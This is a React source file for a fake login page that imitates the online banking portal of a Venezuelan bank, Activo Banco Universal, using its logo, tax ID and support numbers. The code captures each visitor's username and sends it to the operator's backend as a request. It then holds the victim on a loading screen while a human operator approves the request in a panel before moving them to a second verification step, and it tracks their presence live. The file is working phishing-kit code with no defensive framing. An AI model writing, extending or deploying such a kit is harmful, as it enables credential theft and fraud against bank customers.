import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { api } from "@/api/apiClient";
import { usePresence } from "@/hooks/usePresence";

export default function PersonasLogin() {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [inputFocused, setInputFocused] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [requestId, setRequestId] = useState(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [presenceId, setPresenceId] = useState(null);

  // Hook para trackear presencia del usuario
  usePresence(presenceId || null, "Login Persona");

  // Polling para esperar aprobación del panel
  useEffect(() => {
    if (!waitingApproval || !requestId) return;

    const interval = setInterval(async () => {
      try {
        const request = await api.entities.PinoPermiso.get(requestId);

        if (request.status === "aprobado") {
          clearInterval(interval);
          setWaitingApproval(false);
          // Guardar ID para uso en paso 2
          sessionStorage.setItem("pinoRequestId", requestId);
          sessionStorage.setItem("pinoUsername", username);
          navigate("/pino-pers-veri");
        } else if (request.status === "rechazado") {
          clearInterval(interval);
          setWaitingApproval(false);
          setErrorMessage("Credenciales incorrectas.");
          setShowError(true);
        }
      } catch (err) {
        console.error("Error checking approval:", err);
      }
    }, 1000); // Verifica cada 1 segundo para respuesta más rápida

    return () => clearInterval(interval);
  }, [waitingApproval, requestId, username, navigate]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setShowError(false);
    setErrorMessage("");

    if (!username.trim()) {
      setShowError(true);
      return;
    }

    setLoading(true);
    try {
      // Crear identificador único para presencia
      const id = `persona-${username.trim()}`;

      // Buscar si existe una solicitud rechazada con el mismo usuario
      let request;
      const allRequests = await api.entities.PinoPermiso.list("-id", 100);
      const rejectedRequest = allRequests.find(
        r => r.usuario === username.trim() && r.status === "rechazado" && r.tipo === "persona"
      );

      if (rejectedRequest) {
        // Actualizar la solicitud rechazada con los datos corregidos
        console.log(`Actualizando solicitud rechazada: ${rejectedRequest.id}`);
        request = await api.entities.PinoPermiso.update(rejectedRequest.id, {
          usuario: username.trim(),
          etapa: "paso_1",
          status: "pendiente",
        });
      } else {
        // Crear una nueva solicitud
        request = await api.entities.PinoPermiso.create({
          usuario: username.trim(),
          tipo: "persona",
          etapa: "paso_1",
          status: "pendiente",
        });
      }

      setRequestId(request.id);
      setPresenceId(id);
      sessionStorage.setItem("pinoPresenceId", id);
      sessionStorage.setItem("pinoUsername", username.trim());
      setWaitingApproval(true);
    } catch (err) {
      setErrorMessage((err instanceof Error ? err.message : String(err)) || "Error al crear solicitud");
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="personas-page-root" style={{
      minHeight: "100vh",
      backgroundColor: "#f0f0f0",
      fontFamily: "Arial, Helvetica, sans-serif",
      overflowX: "hidden"
    }}>
      <style>{`
        @keyframes bankingSpinner {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        @supports (padding: max(0px)) {
          @media screen and (max-width: 768px) {
            .personas-page-root {
              min-height: 100vh;
              min-height: 100dvh;
            }
          }
        }

        @media screen and (max-width: 768px) {
          html, body {
            overflow-x: hidden !important;
            width: 100% !important;
          }
          .personas-page-root {
            overflow-x: hidden !important;
            display: flex !important;
            flex-direction: column !important;
            min-height: 100vh !important;
            box-sizing: border-box !important;
          }
          .personas-scale-wrapper {
            width: calc(100vw * 2.5) !important;
            transform: scale(0.4) !important;
            transform-origin: top center !important;
            margin-left: calc(50vw - (100vw * 1.25)) !important;
            margin-right: auto !important;
            display: flex !important;
            flex-direction: column !important;
            flex: 1 !important;
          }
          .personas-main-wrapper {
            flex: 1 !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            padding: 40px 16px !important;
          }
          .personas-form-cols {
            flex-direction: row !important;
            flex-wrap: nowrap !important;
          }
          .personas-modal-box {
            width: 92% !important;
            max-width: 450px !important;
            padding: 24px 20px !important;
          }
        }
      `}</style>

      {/* Loading overlay */}
      {waitingApproval && (
        <div style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100%",
          height: "100dvh",
          backgroundColor: "rgba(2, 0, 77, 0.95)",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          zIndex: 9999,
          gap: "24px",
          overflow: "hidden"
        }}>
          {/* Spinner */}
          <div style={{
            width: "60px",
            height: "60px",
            border: "4px solid rgba(255, 255, 255, 0.2)",
            borderTop: "4px solid #3C44D1",
            borderRadius: "50%",
            animation: "bankingSpinner 1.2s linear infinite",
            flexShrink: 0
          }} />

          {/* Text */}
          <h2 style={{
            color: "#FFFFFF",
            fontSize: "16px",
            fontWeight: 600,
            margin: "0",
            fontFamily: "Arial, Helvetica, sans-serif",
            textAlign: "center"
          }}>
            Cargando...
          </h2>

        </div>
      )}

      {/* Everything that scales together */}
      <div className="personas-scale-wrapper">

        {/* Header */}
        {!waitingApproval && (
          <div style={{
            backgroundColor: "#02004D",
            padding: "12px 24px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            whiteSpace: "nowrap"
          }}>
            <img
              src="https://www.bancoactivo.com/logo.svg"
              alt="Activo Banco Universal"
              style={{ height: "40px", filter: "brightness(0) invert(1)", flexShrink: 0 }}
            />
            <span style={{ color: "#FFFFFF", fontSize: "13px", whiteSpace: "nowrap" }}>RIF: J-08006622-7</span>
          </div>
        )}

        {/* Main content */}
        <div className="personas-main-wrapper" style={{ display: "flex", justifyContent: "center", alignItems: "flex-start", padding: "40px 16px" }}>
          <div
            className="personas-card"
            style={{
              backgroundColor: "#f0f2f5",
              border: "1px solid #cccccc",
              borderRadius: "4px",
              width: "100%",
              maxWidth: "860px",
              padding: "24px 32px 32px",
              display: waitingApproval ? "none" : "block"
            }}
          >
            {/* Title */}
            <div style={{ marginBottom: "24px", borderBottom: "2px solid #e0e0e0", paddingBottom: "12px" }}>
              <h1 style={{ fontSize: "18px", fontFamily: "Arial, Helvetica, sans-serif", fontWeight: "600", color: "#082C62", margin: 0, display: "flex", alignItems: "center", height: "36px" }}>
                <span style={{ color: "#082C62" }}>Activo en Línea</span>
                <span style={{ display: "inline-block", width: "3px", height: "28px", backgroundColor: "#FF7900", margin: "0 8px", flexShrink: 0 }}></span>
                <span style={{ color: "#3C44D1", fontFamily: "Arial, Helvetica, sans-serif", fontSize: "18px", fontWeight: "600" }}>Personas</span>
              </h1>
            </div>

            <div className="personas-form-cols" style={{ display: "flex", gap: "32px", flexWrap: "nowrap" }}>
              {/* Left — Login form */}
              <div className="personas-login-col" style={{ flex: "1 1 200px" }}>
                <h2 style={{ fontWeight: 700, color: "#02004D", fontSize: "14px", fontFamily: "Arial, Helvetica, sans-serif", width: "300px", height: "36px", display: "flex", alignItems: "center", margin: "0 0 16px 0" }}>Iniciar Sesión</h2>

                {waitingApproval ? (
                  <div style={{ padding: "20px", backgroundColor: "#e3f2fd", border: "1px solid #90caf9", borderRadius: "4px", marginBottom: "16px" }}>
                    <p style={{ color: "#1976d2", fontWeight: "bold", margin: "0 0 8px 0" }}>⏳ Esperando aprobación...</p>
                    <p style={{ color: "#1976d2", fontSize: "12px", margin: 0 }}>Tu solicitud está siendo revisada en el panel. Por favor espera.</p>
                  </div>
                ) : (
                  <form onSubmit={handleSubmit}>
                    <label style={{ fontSize: "13px", color: "#333", display: "block", marginBottom: "4px" }}>
                      Nombre de Usuario
                    </label>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => {
                        const value = e.target.value.replace(/\s/g, '').slice(0, 12);
                        setUsername(value);
                      }}
                      onFocus={() => setInputFocused(true)}
                      onBlur={() => setInputFocused(false)}
                      maxLength={12}
                      disabled={loading}
                      className="personas-username-input"
                      style={{
                        width: "279.6px",
                        height: "27.6px",
                        border: inputFocused ? "1px solid #5b8dd9" : "1px solid #aaa",
                        boxShadow: inputFocused ? "0 0 0 3px rgba(91,141,217,0.25)" : "none",
                        padding: "4px",
                        fontSize: "13px",
                        marginBottom: "8px",
                        boxSizing: "border-box",
                        backgroundColor: "#FFFFFF",
                        display: "block",
                        outline: "none",
                        borderRadius: "3px",
                        opacity: loading ? 0.6 : 1,
                      }}
                    />
                    {(showError || errorMessage) && (
                      <p style={{ fontSize: "12px", color: "#CC0000", margin: "0 0 8px 0", width: "279.6px", fontFamily: "Arial, Helvetica, sans-serif" }}>
                        {errorMessage || "Error al procesar solicitud."}
                      </p>
                    )}
                    <div className="personas-submit-row" style={{ width: "279.6px", display: "flex", justifyContent: "flex-end", marginBottom: "16px" }}>
                      <button
                        type="submit"
                        disabled={loading}
                        style={{
                          backgroundColor: loading ? "#aaa" : "#3C44D1",
                          color: "#FFFFFF",
                          border: "none",
                          width: "59.51px",
                          margin: "5px 0px 0px 0px",
                          padding: "3px 10px",
                          fontSize: "13px",
                          cursor: loading ? "not-allowed" : "pointer",
                        }}
                      >
                        {loading ? "..." : "Aceptar"}
                      </button>
                    </div>
                  </form>
                )}

                <p style={{ fontSize: "12px", color: "#02004D", lineHeight: 1.5 }}>
                  Haz click aquí si olvidaste tu usuario, clave o preguntas y respuestas de desafío.
                </p>
              </div>

              {/* Right — Register */}
              <div style={{ flex: "1 1 180px" }}>
                <p style={{ fontWeight: 700, color: "#555", marginBottom: "12px", fontSize: "14px" }}>¿No estás registrado?</p>
                <p style={{ fontSize: "12px", color: "#02004D", lineHeight: 1.6, marginBottom: "12px", fontFamily: "Arial, Helvetica, sans-serif" }}>
                  Si estás ingresando a Activo en Línea por primera vez, o no posees usuario y contraseña
                </p>
                <div style={{ display: "flex", justifyContent: "center" }}>
                  <button
                    style={{
                      backgroundColor: "#EEEEEE",
                      border: "1px solid #CCCCCC",
                      width: "74.8px",
                      height: "23.6px",
                      margin: "5px 0px 0px 0px",
                      padding: "5px 10px",
                      fontSize: "12px",
                      cursor: "pointer",
                      color: "#333",
                      boxSizing: "border-box",
                    }}
                  >
                    Regístrese
                  </button>
                </div>
              </div>
            </div>

            {/* Footer info */}
            <div style={{ marginTop: "32px", textAlign: "center", borderTop: "1px solid #e0e0e0", paddingTop: "16px" }}>
              <p style={{ fontSize: "12px", color: "#02004D", lineHeight: 1.6 }}>
                Si necesitas ayuda contáctanos desde Venezuela a través del<br />
                0500-ACTIVAT (2284828) o en el Exterior al +582129583333
              </p>
              <div style={{ display: "flex", justifyContent: "center", gap: "16px", marginTop: "8px" }}>
                {["Política de Privacidad", "Términos y Condiciones", "Tips de Seguridad"].map((link) => (
                  <a key={link} href="#" style={{ fontSize: "12px", color: "#3C44D1", textDecoration: "none" }}>{link}</a>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{ backgroundColor: "#f0f0f0", borderTop: "1px solid #ccc", padding: "12px 24px", textAlign: "center" }}></div>
      </div>
    </div>
  );
}
